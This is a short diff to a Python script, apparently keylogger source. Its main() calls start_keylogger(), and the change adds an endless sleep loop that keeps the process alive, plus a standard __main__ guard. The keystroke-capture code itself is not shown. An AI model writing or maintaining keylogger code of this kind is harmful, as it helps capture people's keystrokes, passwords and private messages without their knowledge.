@@ -124,5 +124,10 @@ def main():
     # Start the keylogger
     start_keylogger()
 
+    # Keep the main process running
+    while True:
+        time.sleep(1000)
 
-main()
+
+if __name__ == "__main__":
+    main()
